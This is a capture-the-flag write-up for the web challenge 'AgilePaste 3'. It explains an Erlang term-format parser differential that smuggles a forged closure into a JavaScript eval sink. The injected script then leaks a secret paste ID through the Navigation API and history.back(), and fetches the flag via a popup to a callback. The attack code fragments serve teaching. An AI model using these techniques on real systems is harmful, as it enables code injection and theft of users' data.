# AgilePaste 3 — NNS CTF 2026

**Category:** Web  
**Team:** AsylumBR  
**Solves:** 28  
**Points:** 172  

## TL;DR

The interesting part of AgilePaste 3 was a parser differential around Erlang's External Term Format (ETF).

By sending a `MAP_EXT` with duplicate `title` keys, I could make the validation side see a normal `title`/`body` map while the AtomVM side still ended up processing a forged `Jason.Fragment`.

That fragment carried a `NEW_FUN_EXT` closure. Once it reached the application's `Popcorn.Wasm.run_js` path, the closure gave me JavaScript execution in the bot's browser context.

From there the second half was mostly browser state:

```text
ETF duplicate keys
  -> forged Jason.Fragment
  -> NEW_FUN_EXT
  -> run_js
  -> JavaScript execution
  -> same-origin popup
  -> Navigation API + history.back()
  -> previous /p/<SECRET_ID>
  -> /api/paste/<SECRET_ID>
  -> flag
```

## 1. Recon

The frontend looked like a normal pastebin, except that it was running Elixir inside AtomVM/WebAssembly through Popcorn.

Creating a paste eventually did:

```js
const saved = await popcorn.call(
  ["save", title, body],
  { process: "main" }
);

await fetch("/api/paste", {
  method: "POST",
  headers: { "content-type": "text/plain" },
  body: saved.data
});
```

Opening one did the reverse:

```js
const response = await fetch(
  `/raw/${encodeURIComponent(pasteId)}/workspace.apaste`
);

popcorn.cast(
  ["open", await response.text()],
  { process: "main" }
);
```

The useful files were exposed by the application itself. `/index.js` pointed at `/bundle.avm` and `iframe.mjs`, and `/bundle.avm` was directly downloadable.

I did not recover the original Elixir source. I inspected the BEAM modules embedded in the AVM bundle instead: atoms, imports, exports and code metadata.

The modules that mattered were:

```text
Elixir.AgilePaste.Note
Elixir.AgilePaste.View
Elixir.AgilePaste.Worker
Elixir.Popcorn.Wasm
```

Two relationships stood out:

```text
AgilePaste.Worker
  -> AgilePaste.Note.decode/1
  -> AgilePaste.View.note/1

AgilePaste.View
  -> Popcorn.Wasm.run_js/2
```

`AgilePaste.Note` imported `Base.decode64`, `binary_to_term`, `term_to_binary`, `map_get`, `maps.to_list`, etc., which was enough to identify the paste format as Base64-encoded ETF.

## 2. The Bot Flow

The admin bot used the same tab for both the secret paste and the attacker paste:

```text
1. visit /
2. create title="personal", body=FLAG
3. visit /p/<SECRET_ID>
4. visit /p/<ATTACKER_ID>
5. wait
```

So when my payload ran:

```text
previous history entry = /p/<SECRET_ID>
current history entry  = /p/<ATTACKER_ID>
```

That became important later.

## 3. ETF Parser Differential

The final term had duplicate `title` keys:

```text
"title" => "SAFE-FIRST"
"title" => malicious Jason.Fragment
"title" => "SAFE-LAST"
"body"  => "BODY"
```

Before sending it, I checked the same bytes with the Python Erlang decoder used during testing:

```python
parsed = erlang.binary_to_term(term)

assert len(parsed) == 2

for k, v in parsed.items():
    assert isinstance(k, erlang.OtpErlangBinary)
    assert isinstance(v, erlang.OtpErlangBinary)
```

From that side, the result was just a two-field map with binary keys and values.

The important observation was empirical: the validation path and the AtomVM/Elixir path did not agree on the duplicate-key term. The Python-side view collapsed to a safe-looking map, while the AtomVM path still caused the intermediate `Jason.Fragment` value to be processed.

I did not fully reconstruct the exact duplicate-key retention rule inside every decoder, so I am not going to pretend otherwise. The exploitable fact was the parser differential itself.

## 4. From `Jason.Fragment` to JavaScript

This was the part that took the most reversing.

`AgilePaste.View` exposes `note/1` and imports `Popcorn.Wasm.run_js/2`. `AgilePaste.Worker`, in turn, imports `AgilePaste.View.note/1` and calls it after decoding a note.

That gave the relevant application path:

```text
serialized note
  -> AgilePaste.Note.decode/1
  -> AgilePaste.Worker
  -> AgilePaste.View.note/1
  -> Popcorn.Wasm.run_js/2
```

The malicious value was made to look like a `Jason.Fragment`:

```python
fragment = emap([
    (
        ea("__struct__"),
        ea("Elixir.Jason.Fragment")
    ),
    (
        ea("encode"),
        closure
    ),
])
```

A `Jason.Fragment` is special because its `encode` field is callable during JSON encoding. Instead of a normal fragment closure, I supplied a serialized local fun via `NEW_FUN_EXT`.

The final values used for that fun were:

```python
FUN_INDEX = 1
VISIBLE_ARITY = 1
NUM_FREE = 1
OLD_INDEX = 1
OLD_UNIQ = 82945812
```

These were matched against the local function metadata in `Elixir.Jason.Fragment` while reversing the bundle. The complete serialization is in [`exploit.py`](./exploit.py).

The closure captured the JavaScript bytes:

```python
closure = new_fun(eb(RAW))
```

and was inserted into the fragment's `encode` field.

The important connection is that once the forged fragment survived note decoding and reached the view/render path, its encoder closure was evaluated in the path feeding `Popcorn.Wasm.run_js`.

On the JavaScript side, `iframe.mjs` made the sink very obvious:

```js
moduleInstance["onRunTrackedJs"] = (scriptString, isDebug) => {
    let fn;

    const indirectEval = eval;
    fn = indirectEval(scriptString);

    return fn?.(moduleInstance);
};
```

So the chain was not just "Fragment somehow becomes RCE". The useful path was:

```text
forged Jason.Fragment
  -> its encode closure is invoked
  -> captured payload reaches the run_js bridge
  -> onRunTrackedJs receives a script string
  -> indirect eval
```

I did not recover a clean line-for-line Elixir source version of `AgilePaste.View.note/1`, so this is based on the BEAM imports/code metadata plus the runtime behavior of the final payload.

The initial JavaScript wrapper was:

```js
(()=>{
    return window.eval(PARENT_JS);
})()
```

At that point I had JavaScript running in the bot's origin.

## 5. Leaking the Previous Paste ID

The flag itself was not directly available to the attacker paste. What I needed was the ID of the previous paste.

The Navigation API exposed it during a history traversal:

```js
navigation.addEventListener("navigate", (event) => {
    const url = event.destination?.url || "";
    const parsed = new URL(url);

    const match = parsed.pathname.match(
        /^\/p\/([0-9a-f]+)$/i
    );

    if (!match) return;

    const secretId = match[1];
    // ...
});
```

Then:

```js
history.back();
```

During the `navigate` event, `event.destination.url` contained:

```text
/p/<SECRET_ID>
```

## 6. Keeping Something Alive

There was an obvious problem: `history.back()` unloads the attacker page.

So before traversing history I opened a same-origin popup:

```js
const w = window.open(
    "/",
    "agilepaste_nav_receiver"
);
```

Because it was same-origin, I could install the receiver directly:

```js
w.eval(POPUP_CODE);
```

When the `navigate` event exposed the secret ID, the parent sent it over before unloading:

```js
w.postMessage(
    {
        type: "AGILE_SECRET_ID",
        id: secretId
    },
    location.origin
);
```

The popup now had everything it needed.

## 7. Fetching the Secret Paste

The popup fetched the paste directly:

```js
const response = await fetch(
    "/api/paste/" + encodeURIComponent(id),
    {
        credentials: "same-origin",
        cache: "no-store"
    }
);

const text = await response.text();
```

Then it searched the returned data for the flag:

```js
const candidate =
    parsed?.excerpt ||
    parsed?.body ||
    parsed?.title ||
    text ||
    "";

const match = String(candidate).match(
    /NNS\{[^}]+\}/i
);
```

The callback received:

```text
NNS{I_fin4l1Y_defeated_an_461l3past3_W17h_some_veRY_saFe_t3rm5}
```

## 8. Final Exploit

I kept the full exploit out of the body of the write-up so this page stays readable.

The complete, sanitized version is here: [`exploit.py`](./exploit.py)

The original CTF instance URL and my callback URL were removed.

### Dependencies

```bash
pip install -r requirements.txt
```

### Usage

```bash
python3 exploit.py \
  --target https://INSTANCE \
  --callback https://YOUR-CALLBACK
```

The complete, sanitized version is here:

[`exploit.py`](./exploit.py)

The original CTF instance URL and my callback URL were removed.

## 9. Exploit Chain

```text
1. Build an ETF MAP_EXT with duplicate title keys
2. Validation sees a safe-looking title/body map
3. AtomVM still processes the intermediate Jason.Fragment
4. Jason.Fragment contains a forged NEW_FUN_EXT closure
5. The fragment reaches the AgilePaste.View -> run_js path
6. Popcorn's JS bridge evaluates the resulting script
7. Open a same-origin popup
8. Register navigation.navigate
9. Trigger history.back()
10. event.destination.url exposes /p/<SECRET_ID>
11. Send SECRET_ID to the popup with postMessage
12. Popup fetches /api/paste/<SECRET_ID>
13. Extract NNS{...}
14. Exfiltrate the flag
```

## Flag

```text
NNS{I_fin4l1Y_defeated_an_461l3past3_W17h_some_veRY_saFe_t3rm5}
```

## Notes

This was my first team CTF, so a lot of the work here was done by testing assumptions and going back to the bundle whenever something did not make sense.

The two parts I found most interesting were the ETF/AtomVM parser mismatch and using browser history as the last step after getting JavaScript execution.
